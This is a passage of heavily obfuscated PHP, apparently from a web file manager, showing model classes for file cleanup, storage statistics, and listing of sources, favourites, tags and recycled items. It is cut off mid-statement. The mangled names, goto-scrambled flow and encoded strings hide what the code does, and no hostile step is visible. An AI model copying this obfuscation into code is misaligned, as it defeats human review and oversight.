$_SERVER[Šº]; if (!$DƒŒ®î™Ö && !$B¼Ô¹ˆËËŸ) { return !1; } $f‘À·Âõ¹é = array($BØùƒ‘Š½‹[1734] => $DƒŒ®î™Ö); if ($B¼Ô¹ˆËËŸ) { $f‘À·Âõ¹é = array($BØùƒ‘Š½‹[1735] => $B¼Ô¹ˆËËŸ); } return $this->order($BØùƒ‘Š½‹[1738])->where($f‘À·Âõ¹é)->find(); } public function clearEmpty($b’Èğ“Ä« = 0) { goto Fàèãá±Àê; fñŠøœ†…Ò: $F‘‰Ê‡Œ˜• = $this->where($FªËˆŒã®)->select(); if (!$F‘‰Ê‡Œ˜•) { return; } $Aõ±òŒØ¢ã = new Task($cŞæà¬¨˜Æ[1740], $cŞæà¬¨˜Æ[33], count($F‘‰Ê‡Œ˜•)); goto Fš‡ºÍ´ä›; Fš‡ºÍ´ä›: foreach ($F‘‰Ê‡Œ˜• as $b­íçĞ¹ë) { $Aõ±òŒØ¢ã->update(1); $this->resetFile($b­íçĞ¹ë); } $Aõ±òŒØ¢ã->end(); goto c×ÕÜ¶¦; Fàèãá±Àê: $cŞæà¬¨˜Æ =& $_SERVER[Šº]; $E£¶Ö¹«± = time() - 3600 * 24 * $b’Èğ“Ä«; $FªËˆŒã® = $cŞæà¬¨˜Æ[1739] . $E£¶Ö¹«±; goto fñŠøœ†…Ò; c×ÕÜ¶¦: } public function resetFile($F²•ÍàùÔ) { goto A•÷ëçÄ¾Ü; A•÷ëçÄ¾Ü: $D©òìà…ì¦ =& $_SERVER[Šº]; $B»ƒè“•Ü = array($D©òìà…ì¦[455] => $F²•ÍàùÔ[$D©òìà…ì¦[454]]); $E¯‡…é—¸Ì = Model($D©òìà…ì¦[1192])->where($B»ƒè“•Ü)->count(); goto F©‡ŞÂ…Û; F©‡ŞÂ…Û: $a‡•ÔÅŒŞ = Model($D©òìà…ì¦[1741])->where($B»ƒè“•Ü)->count(); $AÃÍ‡ğ˜½¢ = intval($E¯‡…é—¸Ì) + intval($a‡•ÔÅŒŞ); if ($AÃÍ‡ğ˜½¢ == 0) { IO::remove($F²•ÍàùÔ[$D©òìà…ì¦[76]]); Model($D©òìà…ì¦[1742])->delete($F²•ÍàùÔ[$D©òìà…ì¦[454]]); $this->where($B»ƒè“•Ü)->delete(); $this->metaSet($F²•ÍàùÔ[$D©òìà…ì¦[454]], null, null); return; } goto D­¢ÓÀÒ†ö; D­¢ÓÀÒ†ö: if ($F²•ÍàùÔ[$D©òìà…ì¦[1737]] != $AÃÍ‡ğ˜½¢) { $this->where($B»ƒè“•Ü)->save(array($D©òìà…ì¦[1733] => $AÃÍ‡ğ˜½¢)); } goto cìàÊø•Ü; cìàÊø•Ü: } public function storageInfo($E¥µÕî—´ = false) { goto cÕØíºÃÊâ; e¤œÒÕ‰À¹: for ($eØŒÀè¹Œƒ = 0; $eØŒÀè¹Œƒ < $bŞ·Ò‘ô”; $eØŒÀè¹Œƒ = $eØŒÀè¹Œƒ + $cŠ‡¥Ùö¹œ) { $A˜›°Ğ­îÖ = $this->limit($eØŒÀè¹Œƒ, $eØŒÀè¹Œƒ + $cŠ‡¥Ùö¹œ)->select(); foreach ($A˜›°Ğ­îÖ as $E¹óÙ¥çŠ¶) { $EÇï‰Åµ®À += $E¹óÙ¥çŠ¶[$aÛÛíÚ¾é«[78]] * $E¹óÙ¥çŠ¶[$aÛÛíÚ¾é«[1737]]; $A˜¡‰ªóèñ += $E¹óÙ¥çŠ¶[$aÛÛíÚ¾é«[78]] * ($E¹óÙ¥çŠ¶[$aÛÛíÚ¾é«[1737]] - 1); $f¾â³‹’ÂŒ += $E¹óÙ¥çŠ¶[$aÛÛíÚ¾é«[1737]]; } } $d¼µÊÎ£ìÅ = array($aÛÛíÚ¾é«[1743] => $EÇï‰Åµ®À, $aÛÛíÚ¾é«[1744] => $A˜¡‰ªóèñ, $aÛÛíÚ¾é«[1745] => $A˜¡‰ªóèñ / $EÇï‰Åµ®À, $aÛÛíÚ¾é«[82] => $bŞ·Ò‘ô”, $aÛÛíÚ¾é«[1746] => $f¾â³‹’ÂŒ); return $d¼µÊÎ£ìÅ; goto d…Ü»´ŒŸ; bÁôÊ‡Œ‚ª: $EÇï‰Åµ®À = 1; $f¾â³‹’ÂŒ = 0; $cŠ‡¥Ùö¹œ = 5000; goto e¤œÒÕ‰À¹; cÕØíºÃÊâ: $aÛÛíÚ¾é« =& $_SERVER[Šº]; $bŞ·Ò‘ô” = $this->count() + 0.0; $A˜¡‰ªóèñ = 0; goto bÁôÊ‡Œ‚ª; d…Ü»´ŒŸ: } } goto a¤¤±¿Ìœ¸; EØåÓÕÛôé: class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\165\162\143\145"; protected $tableMeta = array("\164\x61\142\154\145\116\x61\x6d\145" => "\x69\x6f\x5f\x73\x6f\165\162\x63\145\x5f\155\145\x74\141", "\x6d\145\164\141\x46\151\145\x6c\144" => "\163\157\165\162\143\x65\x49\104"); protected $dataAuto = array(array("\x6d\x6f\144\151\x66\171\x54\x69\155\x65", "\x74\x69\x6d\145", "\x69\156\x73\145\162\164", "\146\165\156\x63\164\x69\157\x6e"), array("\143\x72\x65\x61\164\x65\124\x69\155\x65", "\164\x69\x6d\145", "\x69\x6e\x73\x65\x72\164", "\x66\x75\x6e\143\164\x69\x6f\x6e"), array("\166\x69\145\x77\124\x69\x6d\145", "\164\151\155\x65", "\x69\156\163\x65\x72\x74", "\146\x75\x6e\143\x74\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($b ‘ö½¯‡) { return $this->listSource(array($_SERVER[Šº][402] => $b ‘ö½¯‡)); } public function typeName($bµˆ”ø¹) { static $c”í‹—‚À¬ = array(self::TYPE_SYSTEM => "\x73\x79\x73\164\x65\155", self::TYPE_USER => "\165\x73\x65\x72", self::TYPE_GROUP => "\147\162\x6f\x75\x70"); return $c”í‹—‚À¬[$bµˆ”ø¹ . $_SERVER[Šº][33]]; } public function sourceListInfo($Bİ¡ª¯°´É, $eçŒá¼®ìˆ = false) { goto bÄ›²ÖŸğ×; bÄ›²ÖŸğ×: $Bìšƒ¨ö” =& $_SERVER[Šº]; $Bİ¡ª¯°´É = $Bİ¡ª¯°´É ? $Bİ¡ª¯°´É : array(); $Bİ¡ª¯°´É = array_filter(array_unique($Bİ¡ª¯°´É)); goto Eæ»Èİ«ØÎ; B®¤„ËŒ¨Ó: return array_to_keyvalue($eßØ¼Êè’ù, $Bìšƒ¨ö”[403]); goto bî§ÃØÔ§º; Eæ»Èİ«ØÎ: if (!$Bİ¡ª¯°´É) { return array(); } $eßØ¼Êè’ù = $this->where(array($Bìšƒ¨ö”[403] => array($Bìšƒ¨ö”[7], $Bİ¡ª¯°´É)))->select(); $this->_listDataApply($eßØ¼Êè’ù, $eçŒá¼®ìˆ); goto B®¤„ËŒ¨Ó; bî§ÃØÔ§º: } public function pathInfoFilter(&$eªà»ºÅ§÷) { goto FÕØÁÒ«‚›; e£Ä¦³ééÖ: if (!$e Ïêïˆ) { goto d¬ãõÎÄ•; e¤Ñ›‚ÕïÛ: $bšİšœ¥èˆ = $D„Ã‰ƒÀ¾‘[407]; $f‹î˜Êğ½ = explode($D„Ã‰ƒÀ¾‘[47], $bšİšœ¥èˆ); $e Ïêïˆ = explode($D„Ã‰ƒÀ¾‘[47], $fÜ„¸êÀÙ³); goto FÈ²…ÚÍ; d¬ãõÎÄ•: $fÜ„¸êÀÙ³ = $D„Ã‰ƒÀ¾‘[404]; $fÜ„¸êÀÙ³ .= $D„Ã‰ƒÀ¾‘[405]; $fÜ„¸êÀÙ³ .= $D„Ã‰ƒÀ¾‘[406]; goto e¤Ñ›‚ÕïÛ; FÈ²…ÚÍ: $FÖ×ô®æÆ = array(); foreach ($e Ïêïˆ as $EˆŠÃ„åŒÕ) { if (in_array($EˆŠÃ„åŒÕ, $f‹î˜Êğ½)) { continue; } $FÖ×ô®æÆ[] = $EˆŠÃ„åŒÕ; } goto aßâ¡ ÇÄ; aßâ¡ ÇÄ: } $eªà»ºÅ§÷[$D„Ã‰ƒÀ¾‘[76]] = $D„Ã‰ƒÀ¾‘[408] . $eªà»ºÅ§÷[$D„Ã‰ƒÀ¾‘[403]] . $D„Ã‰ƒÀ¾‘[409]; $eªà»ºÅ§÷[$D„Ã‰ƒÀ¾‘[29]] = $eªà»ºÅ§÷[$D„Ã‰ƒÀ¾‘[410]] == 1 ? $D„Ã‰ƒÀ¾‘[77] : $D„Ã‰ƒÀ¾‘[192]; goto a†¾õ°ùŠ‹; a†¾õ°ùŠ‹: $eªà»ºÅ§÷[$D„Ã‰ƒÀ¾‘[411]] = $this->typeName($eªà»ºÅ§÷[$D„Ã‰ƒÀ¾‘[411]]); if ($eªà»ºÅ§÷[$D„Ã‰ƒÀ¾‘[410]] != 1) { $eªà»ºÅ§÷[$D„Ã‰ƒÀ¾‘[168]] = $eªà»ºÅ§÷[$D„Ã‰ƒÀ¾‘[412]]; unset($eªà»ºÅ§÷[$D„Ã‰ƒÀ¾‘[412]]); } $dÌäì£á¸Ÿ = $e Ïêïˆ; goto f²‰¸ÀÛâ ; FÕØÁÒ«‚›: $D„Ã‰ƒÀ¾‘ =& $_SERVER[Šº]; static $e Ïêïˆ = false; static $FÖ×ô®æÆ = false; goto e£Ä¦³ééÖ; f²‰¸ÀÛâ : if (isset($eªà»ºÅ§÷[$D„Ã‰ƒÀ¾‘[413]]) && $eªà»ºÅ§÷[$D„Ã‰ƒÀ¾‘[413]][$D„Ã‰ƒÀ¾‘[414]] == -1) { $dÌäì£á¸Ÿ = $FÖ×ô®æÆ; } $eªà»ºÅ§÷ = array_field_key($eªà»ºÅ§÷, $dÌäì£á¸Ÿ); return $eªà»ºÅ§÷; goto dÛÊ¨ÚÔ†º; dÛÊ¨ÚÔ†º: } public function listUserFav() { goto A…œ „èÉª; aÕ¡Ü¡¦Ûù: foreach ($EÁ›½Õ˜Ö as &$aÀÔ²ÈÎ­õ) { $aÀÔ²ÈÎ­õ = array($fäëµŒÃ¸[419] => $aÀÔ²ÈÎ­õ[$fäëµŒÃ¸[392]], $fäëµŒÃ¸[420] => $aÀÔ²ÈÎ­õ[$fäëµŒÃ¸[28]], $fäëµŒÃ¸[421] => $aÀÔ²ÈÎ­õ[$fäëµŒÃ¸[76]], $fäëµŒÃ¸[422] => $aÀÔ²ÈÎ­õ[$fäëµŒÃ¸[29]], $fäëµŒÃ¸[423] => $aÀÔ²ÈÎ­õ[$fäëµŒÃ¸[193]], $fäëµŒÃ¸[424] => $aÀÔ²ÈÎ­õ[$fäëµŒÃ¸[84]]); if ($aÀÔ²ÈÎ­õ[$fäëµŒÃ¸[29]] == $fäëµŒÃ¸[416] && $EÄ‚½Ê÷à÷[$aÀÔ²ÈÎ­õ[$fäëµŒÃ¸[76]]]) { $aÀÔ²ÈÎ­õ[$fäëµŒÃ¸[85]] = $EÄ‚½Ê÷à÷[$aÀÔ²ÈÎ­õ[$fäëµŒÃ¸[76]]]; } } unset($aÀÔ²ÈÎ­õ); return $EÁ›½Õ˜Ö; goto b±ˆ‰î·è; FáÔÑ¦„¯É: $fì’¯ÕÜÔ¨ = array_to_keyvalue($fì’¯ÕÜÔ¨, $fäëµŒÃ¸[33], $fäëµŒÃ¸[76]); if ($fì’¯ÕÜÔ¨) { $EÄ‚½Ê÷à÷ = $this->listSource(array($fäëµŒÃ¸[417] => array($fäëµŒÃ¸[418], $fì’¯ÕÜÔ¨))); } $EÄ‚½Ê÷à÷ = array_to_keyvalue($EÄ‚½Ê÷à÷[$fäëµŒÃ¸[366]], $fäëµŒÃ¸[403]); goto aÕ¡Ü¡¦Ûù; A…œ „èÉª: $fäëµŒÃ¸ =& $_SERVER[Šº]; $EÁ›½Õ˜Ö = Model($fäëµŒÃ¸[415])->listData(); $fì’¯ÕÜÔ¨ = array_filter_by_field($EÁ›½Õ˜Ö, $fäëµŒÃ¸[29], $fäëµŒÃ¸[416]); goto FáÔÑ¦„¯É; b±ˆ‰î·è: } public function listUserTag($FïÂÌ™Ñ) { goto eÙ…È•ƒôŸ; eŠ«ùóÄÑ¾: $fÎï¤ë•‡¶ = array_to_keyvalue($F¸Ğà¶‰˜î[$F¾İ…ãŸË[74]], $F¾İ…ãŸË[33], $F¾İ…ãŸË[403]); $C·ÑÃ»Ç¢ = array_merge($fÎï¤ë•‡¶, $b‰–«‹£‰À); foreach ($Dİ³à¡°’š as $fÍ”µëñ¡) { if (!in_array($fÍ”µëñ¡, $C·ÑÃ»Ç¢)) { $aÓìë·Ş¦±[] = $fÍ”µëñ¡; } } goto cãî™óì‹ß; cãî™óì‹ß: if ($aÓìë·Ş¦±) { Model($F¾İ…ãŸË[427])->removeBySource($aÓìë·Ş¦±); } return $F¸Ğà¶‰˜î; goto d‘Ì£¦ƒ“æ; A›×÷¤Çì‚: $bù»Àñ°Èç = array(); foreach ($bôÆÖ¢„×Ş as $eªé¤¡‚Ñ) { $fÍ”µëñ¡ = $eªé¤¡‚Ñ[$F¾İ…ãŸË[76]]; if (!$fÍ”µëñ¡) { continue; } if (!isset($bù»Àñ°Èç[$fÍ”µëñ¡])) { $bù»Àñ°Èç[$fÍ”µëñ¡] = array(); } $bù»Àñ°Èç[$fÍ”µëñ¡][] = $eªé¤¡‚Ñ[$F¾İ…ãŸË[426]]; } $Dİ³à¡°’š = array(); goto DêÙ¤Ç‚; C‰«áöñ„É: if (!$F¸Ğà¶‰˜î || count($Dİ³à¡°’š) == $F¸Ğà¶‰˜î[$F¾İ…ãŸË[363]][$F¾İ…ãŸË[364]]) { return $F¸Ğà¶‰˜î; } $aÓìë·Ş¦± = array(); $b‰–«‹£‰À = array_to_keyvalue($F¸Ğà¶‰˜î[$F¾İ…ãŸË[75]], $F¾İ…ãŸË[33], $F¾İ…ãŸË[403]); goto eŠ«ùóÄÑ¾; eÙ…È•ƒôŸ: $F¾İ…ãŸË =& $_SERVER[Šº]; if ($FïÂÌ™Ñ && !is_array($FïÂÌ™Ñ)) { $FïÂÌ™Ñ = array($FïÂÌ™Ñ); } $bôÆÖ¢„×Ş = Model($F¾İ…ãŸË[425])->listData(); goto A›×÷¤Çì‚; DêÙ¤Ç‚: foreach ($bù»Àñ°Èç as $aİ Éœ¢ª« => $d¾„§¤‰™á) { $bøõ¶½íò = !0; if (!$FïÂÌ™Ñ) { $Dİ³à¡°’š[] = $aİ Éœ¢ª«; continue; } foreach ($FïÂÌ™Ñ as $cï¶„Ôô†¯) { if (!in_array($cï¶„Ôô†¯, $d¾„§¤‰™á)) { $bøõ¶½íò = !1; break; } } if ($bøõ¶½íò) { $Dİ³à¡°’š[] = $aİ Éœ¢ª«; } } if (!$Dİ³à¡°’š) { return array(); } $F¸Ğà¶‰˜î = $this->listSource(array($F¾İ…ãŸË[417] => array($F¾İ…ãŸË[418], $Dİ³à¡°’š))); goto C‰«áöñ„É; d‘Ì£¦ƒ“æ: } public function listUserRecycle() { $fÊÄæëƒã› =& $_SERVER[Šº]; $F‚ÄéÒâÒš = Model($fÊÄæëƒã›[428])->listData(); if (!$F‚ÄéÒâÒš) { return array(); } $Eç“É‚«„ = array($fÊÄæëƒã›[417] => array($fÊÄæëƒã›[418], $F‚ÄéÒâÒš), $fÊÄæëƒã›[429] => 1); return $this->listSource($Eç“É‚«„); } public function listSource($Dô÷¾´È• , $AæÒä³‹ëÖ = 3000) { goto f‰ÍÓÇ·ˆ; Dé°‹™İ¹: $E÷¹«£¸¨ = $this->field($F´„ÀªÙÊ…)->_makeOrder()->where($Dô÷¾´È• )->selectPage($AæÒä³‹ëÖ); $this->_listDataApply($E÷¹«£¸¨[$D«É‘ô¶ ›[366]]); $this->_listMake($E÷¹«£¸¨); goto c„¡£…‚†Ù; f‰ÍÓÇ·ˆ: $D«É‘ô¶ › =& $_SERVER[Šº]; if (!isset($Dô÷¾´È• [$D«É‘ô¶ ›[430]])) { $Dô÷¾´È• [$D«É‘ô¶ ›[430]] = 0; } $F´„ÀªÙÊ… = $D«É‘ô¶ ›[431]; goto Dé°‹™İ¹; c„¡£…‚†Ù: return $E÷¹«£¸¨; goto D®„À’Áâ; D®„À’Áâ: } protected function _makeOrder() { goto a¶îåù­æ×; a¶îåù­æ×: $DŠ×§Š“ƒÊ =& $_SERVER[Šº]; $AŸ™·“‰Ó² = Model($DŠ×§Š“ƒÊ[432])->get($DŠ×§Š“ƒÊ[433]); $DÕğÎ¯‚‡ = Model($DŠ×§Š“ƒÊ[432])->get($DŠ×§Š“ƒÊ[434]); goto aíƒ´ØµŒ·; aíƒ´ØµŒ·: $c™ŞÃ¡æ• = array($DŠ×§Š“ƒÊ[435] => $DŠ×§Š“ƒÊ[436], $DŠ×§Š“ƒÊ[437] => $DŠ×§Š“ƒÊ[438]); $eõ­ïÂ•¡’ = array($DŠ×§Š“ƒÊ[28] => $DŠ×§Š“ƒÊ[28], $DŠ×§Š“ƒÊ[78] => $DŠ×§Š“ƒÊ[78], $DŠ×§Š“ƒÊ[168] => $DŠ×§Š“ƒÊ[412], $DŠ×§Š“ƒÊ[439] => $DŠ×§Š“ƒÊ[439], $DŠ×§Š“ƒÊ[440] => $DŠ×§Š“ƒÊ[441], $DŠ×§Š“ƒÊ[193] => $DŠ×§Š“ƒÊ[193], $DŠ×§Š“ƒÊ[84] => $DŠ×§Š“ƒÊ[84]); $cºïù¶ªõ = Input::get($DŠ×§Š“ƒÊ[442], $DŠ×§Š“ƒÊ[7], $AŸ™·“‰Ó², array_keys($eõ­ïÂ•¡’)); goto cÆŒ ‚ª×ë; cÆŒ ‚ª×ë: $Aé‡ğ„ÍÀÄ = Input::get($DŠ×§Š“ƒÊ[443], $DŠ×§Š“ƒÊ[7], $DÕğÎ¯‚‡, array_keys($c™ŞÃ¡æ•)); if (!in_array($cºïù¶ªõ, array_keys($eõ­ïÂ•¡’))) { $cºïù¶ªõ = $DŠ×§Š“ƒÊ[28]; } if (!in_array($Aé‡ğ„ÍÀÄ, array_keys($c™ŞÃ¡æ•))) { $cºïù¶ªõ = $DŠ×§Š“ƒÊ[435]; } goto f…¿ÄÅøø; f…¿ÄÅøø: if ($cºïù¶ªõ == $DŠ×§Š“ƒÊ[28]) { } $d…ŸÓ¸´«² = $DŠ×§Š“ƒÊ[444] . $eõ­ïÂ•¡’[$cºïù¶ªõ] . $DŠ×§Š“ƒÊ[50] . $c™ŞÃ¡æ•[$Aé‡ğ„ÍÀÄ]; return $this->order(rtrim(trim($d…ŸÓ¸´«²), $DŠ×§Š“ƒÊ[47])); goto FêÕ±îÍ¼…; FêÕ±îÍ¼…: } protected function _listDataApplyItem($C‰Ã¨Ù¿Ú, $C¸Êøğ• = false) { $d´¥çÏÊ« = array($C‰Ã¨Ù¿Ú); $this->_listDataApply($d´¥çÏÊ«, $C¸Êøğ•); return $d´¥çÏÊ«[0]; } protected function _listDataApply(&$eòä –•¡­, $fÅáÅß£‹ = false) { goto fŒï¿‰“í; D˜Š¨çé”¯: $this->_listAppendUser($eòä –•¡­); $this->_listFilterInfo($eòä –•¡­, $fÅáÅß£‹); goto eâÂÅŒğâ; B©Ëì›ê”“: $this->_listAppendPath($eòä –•¡­); $this->_listAppendAuth($eòä –•¡­); $this->_listAppendSourceInfo($eòä –•¡­, $bŠØÂÊƒˆ¹); goto D˜Š¨çé”¯; dë¾óé•Óá: $bŠØÂÊƒˆ¹ = array_unique($bŠØÂÊƒˆ¹); $this->_listSourceCache($eòä –•¡­); if (!$fÅáÅß£‹) { $this->_listAppendMeta($eòä –•¡­, $bŠØÂÊƒˆ¹); $this->_listAppendFileMeta($eòä –•¡­, $bŠØÂÊƒˆ¹); $this->_listAppendChildren($eòä –•¡­, $bŠØÂÊƒˆ¹); } goto B©Ëì›ê”“; fŒï¿‰“í: $a”ÅÇ†‘èÁ =& $_SERVER[Šº]; if (!$eòä –•¡­) { $eòä –•¡­ = array(); return; } $bŠØÂÊƒˆ¹ = array_to_keyvalue($eòä –•¡­, $a”ÅÇ†‘èÁ[33], $a”ÅÇ†‘èÁ[403]); goto dë¾óé•Óá; eâÂÅŒğâ: } protected function _listSourceCache($EÎ™øŠƒĞŒ) { $d‘Èºè·¹Ç =& $_SERVER[Šº]; foreach ($EÎ™øŠƒĞŒ as $FìºÀ›í ¶) { self::$cacheSourceInfo[$d‘Èºè·¹Ç[445] . $FìºÀ›í ¶[$d‘Èºè·¹Ç[403]]] = $FìºÀ›í ¶; } } protected function _listFilterInfo(&$b«ù›Ğ, $Dâ±‰¸Õ·Ù = false) { $FìÃ—¿™… =& $_SERVER[Šº]; foreach ($b«ù›Ğ as &$Bã²»‘Ñˆ) { $Bã²»‘Ñˆ = $this->pathInfoFilter($Bã²»‘Ñˆ); self::$cachePathInfo[$FìÃ—¿™…[446] . intval($Dâ±‰¸Õ·Ù) . $FìÃ—¿™…[447] . $Bã²»‘Ñˆ[$FìÃ—¿™…[403]]] = $Bã²»‘Ñˆ; } unset($Bã²»‘Ñˆ); } protected function _listMake(&$cà·²Î¶í) { $d‰ìÇ˜é•† =& $_SERVER[Šº]; $cà·²Î¶í[$d‰ìÇ˜é•†[75]] = array(); $cà·²Î¶í[$d‰ìÇ˜é•†[74]] = array(); foreach ($cà·²Î¶í[$d‰ìÇ˜é•†[366]] as $eøÂ†Ûì«…) { $EÌÉÑÉÏÚ— = $eøÂ†Ûì«…[$d‰ìÇ˜é•†[410]] == 1 ? $d‰ìÇ˜é•†[75] : $d‰ìÇ˜é•†[74]; $cà·²Î¶í[$EÌÉÑÉÏÚ—][] = $eøÂ†Ûì«…; } unset($cà·²Î¶í[$d‰ìÇ˜é•†[366]]); } protected function _listAppendMeta(&$a¨¢ÆË±ÃĞ, $cŒÂ¦ºñ„Ñ) { goto C¾™„’í; DíÖ´‹°ÌË: if (!$C£‡½ÍØß†) { return; } $E†›Æïá = array($FÎ—‚••[450], $FÎ—‚••[451]); $E±¶‡Æ×îé = array(); goto E–Ê˜øÅ÷‰; C¾™„’í: $FÎ—‚•• =& $_SERVER[Šº]; $EµŸÌá™™ = array($FÎ—‚••[417] => array($FÎ—‚••[418], $cŒÂ¦ºñ„Ñ)); $C£‡½ÍØß† = Model($FÎ—‚••[448])->field($FÎ—‚••[449])->where($EµŸÌá™™)->select(); goto DíÖ´‹°ÌË; E–Ê˜øÅ÷‰: foreach ($C£‡½ÍØß† as $E‚­ÛĞõ·¥) { if (!isset($E±¶‡Æ×îé[$E‚­ÛĞõ·¥[$FÎ—‚••[403]]])) { $E±¶‡Æ×îé[$E‚­ÛĞõ·¥[$FÎ—‚••[403]]] = array(); } if (in_array($E‚­ÛĞõ·¥[$FÎ—‚••[93]], $E†›Æïá)) { continue; } $E±¶‡Æ×îé[$E‚­ÛĞõ·¥[$FÎ—‚••[403]]][$E‚­ÛĞõ·¥[$FÎ—‚••[93]]] = $E‚­ÛĞõ·¥[$FÎ—‚••[371]]; } foreach ($a¨¢ÆË±ÃĞ as &$a¼è©¦Õº) { $a¼è©¦Õº[$FÎ—‚••[452]] = !1; if (isset($E±¶‡Æ×îé[$a¼è©¦Õº[$FÎ—‚••[403]]])) { $a¼è©¦Õº[$FÎ—‚••[452]] = $E±¶‡Æ×îé[$a¼è©¦Õº[$FÎ—‚••[403]]]; } if ($this->fileIsLock($a¼è©¦Õº) && $a¼è©¦Õº[$FÎ—‚••[413]]) { $C×Î¹°òÖÈ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $a¼è©¦Õº[$FÎ—‚••[413]][$FÎ—‚••[414]] = AuthModel::authDisable($a¼è©¦Õº[$FÎ—‚••[413]][$FÎ—‚••[414]], $C×Î¹°òÖÈ); $a¼è©¦Õº[$FÎ—‚••[413]][$FÎ—‚••[453]][$FÎ—‚••[413]] = $a¼è©¦Õº[$FÎ—‚••[413]][$FÎ—‚••[414]]; } } unset($a¼è©¦Õº); goto A‹¸×©õ; A‹¸×©õ: } protected function _listAppendFileMeta(&$a¼ÁÀ™½Ï¥, $CÕãÔ‹‘Š¸) { goto EŸ‡‹»µÃ; EŸ‡‹»µÃ: $cŞßåÊæœ‰ =& $_SERVER[Šº]; $d‘¬Ëèœªº = array_to_keyvalue($a¼ÁÀ™½Ï¥, $cŞßåÊæœ‰[33], $cŞßåÊæœ‰[454]); $d‘¬Ëèœªº = array_filter(array_unique($d‘¬Ëèœªº)); goto aÔé·¸”Ÿù; c•ÃË–âğ‹: $a†­é¡¾’Ç = $a†­é¡¾’Ç ? $a†­é¡¾’Ç : array(); $B‚»…öÍÔ = array(); foreach ($a†­é¡¾’Ç as $d÷›˜‘·œ“) { if (!isset($B‚»…öÍÔ[$d÷›˜‘·œ“[$cŞßåÊæœ‰[454]]])) { $B‚»…öÍÔ[$d÷›˜‘·œ“[$cŞßåÊæœ‰[454]]] = array(); } $B‚»…öÍÔ[$d÷›˜‘·œ“[$cŞßåÊæœ‰[454]]][$d÷›˜‘·œ“[$cŞßåÊæœ‰[93]]] = $d÷›˜‘·œ“[$cŞßåÊæœ‰[371]]; } goto C®ÁùÆÏëª; aÔé·¸”Ÿù: if (!$d‘¬Ëèœªº) { return; } $fÆ†œ¬‹´Ä = array($cŞßåÊæœ‰[455] => array($cŞßåÊæœ‰[418], $d‘¬Ëèœªº)); $BïÙµÂÔƒ = $cŞßåÊæœ‰[456]; goto CÙÀöŸ§‰õ; CÙÀöŸ§‰õ: $CËÎ¬Ï«Ê = Model($cŞßåÊæœ‰[457])->field($BïÙµÂÔƒ)->where($fÆ†œ¬‹´Ä)->select(); $CËÎ¬Ï«Ê = array_to_keyvalue($CËÎ¬Ï«Ê, $cŞßåÊæœ‰[454]); $a†­é¡¾’Ç = Model($cŞßåÊæœ‰[458])->field($cŞßåÊæœ‰[459])->where($fÆ†œ¬‹´Ä)->select(); goto c•ÃË–âğ‹; C®ÁùÆÏëª: foreach ($a¼ÁÀ™½Ï¥ as &$dõµø„¨) { goto DÆÕïãßğ; DÆÕïãßğ: $a‹º‚˜Œš¬ = $dõµø„¨[$cŞßåÊæœ‰[454]]; if (!$a‹º‚˜Œš¬ || !is_array($CËÎ¬Ï«Ê[$a‹º‚˜Œš¬])) { continue; } $e¼×—Ûµ = $CËÎ¬Ï«Ê[$a‹º‚˜Œš¬]; goto b‘‹ƒ©½¼‘; Dµİ‘ÇÓ¢Ø: unset($CËÎ¬Ï«Ê[$a‹º‚˜Œš¬][$cŞßåÊæœ‰[76]]); $FóÈ•ãÄ²˜ = is_array($B‚»…öÍÔ[$a‹º‚˜Œš¬]) ? $B‚»…öÍÔ[$a‹º‚˜Œš¬] : array(); $dõµø„¨[$cŞßåÊæœ‰[164]] = array_merge($FóÈ•ãÄ²˜, $CËÎ¬Ï«Ê[$a‹º‚˜Œš¬]); goto F±š‘Ë¼á´; b‘‹ƒ©½¼‘: $e¼×—Ûµ[$cŞßåÊæœ‰[78]] = $dõµø„¨[$cŞßåÊæœ‰[78]]; $e¼×—Ûµ[$cŞßåÊæœ‰[28]] = $dõµø„¨[$cŞßåÊæœ‰[28]]; if (!isset(self::$cacheFileInfo[$cŞßåÊæœ‰[460] . $a‹º‚˜Œš¬])) { self::$cacheFileInfo[$cŞßåÊæœ‰[460] . $a‹º‚˜Œš¬] = array_merge(array(), $e¼×—Ûµ); } goto Dµİ‘ÇÓ¢Ø; F±š‘Ë¼á´: if (isset($dõµø„¨[$cŞßåÊæœ‰[164]][$cŞßåÊæœ‰[163]])) { $dõµø„¨[$cŞßåÊæœ‰[163]] = json_decode($dõµø„¨[$cŞßåÊæœ‰[164]][$cŞßåÊæœ‰[163]], !0); unset($dõµø„¨[$cŞßåÊæœ‰[164]][$cŞßåÊæœ‰[163]]); } goto BÁèëôÒÎÁ; BÁèëôÒÎÁ: } unset($dõµø„¨); goto bÎ¯£ÓâÃ; bÎ¯£ÓâÃ: } protected function _listAppendSourceInfo(&$c²õ× ’Å¨, $b³ÚÊÛï§Ü) { goto fœ‡çŒ¬; a±°‹Ùô—¶: $Dæ†ÃÒˆ¶´ = array_to_keyvalue_group($bãÕÇ†¦Õ, $aï¦´¥ù·«[403]); foreach ($c²õ× ’Å¨ as &$cŠĞÉø÷”) { $cŠĞÉø÷”[$aï¦´¥ù·«[85]] = array($aï¦´¥ù·«[464] => 0, $aï¦´¥ù·«[465] => 0, $aï¦´¥ù·«[466] => 0); if (isset($Bî¾„ÔÅÕ¨[$cŠĞÉø÷”[$aï¦´¥ù·«[403]]])) { $cŠĞÉø÷”[$aï¦´¥ù·«[85]][$aï¦´¥ù·«[467]] = 1; $cŠĞÉø÷”[$aï¦´¥ù·«[85]][$aï¦´¥ù·«[468]] = $Bî¾„ÔÅÕ¨[$cŠĞÉø÷”[$aï¦´¥ù·«[403]]][$aï¦´¥ù·«[28]]; } if (isset($bßƒÚö‚Òâ[$cŠĞÉø÷”[$aï¦´¥ù·«[403]]])) { $cŠĞÉø÷”[$aï¦´¥ù·«[85]][$aï¦´¥ù·«[469]] = array(); foreach ($bßƒÚö‚Òâ[$cŠĞÉø÷”[$aï¦´¥ù·«[403]]] as $a¥‚Œ¹ŠÎÅ) { $B†§™„‘” = $aŸ—Š›óùã[$a¥‚Œ¹ŠÎÅ]; $cŠĞÉø÷”[$aï¦´¥ù·«[85]][$aï¦´¥ù·«[469]][] = array($aï¦´¥ù·«[470] => $B†§™„‘”[$aï¦´¥ù·«[392]], $aï¦´¥ù·«[420] => $B†§™„‘”[$aï¦´¥ù·«[28]], $aï¦´¥ù·«[471] => $B†§™„‘”[$aï¦´¥ù·«[472]]); } } if 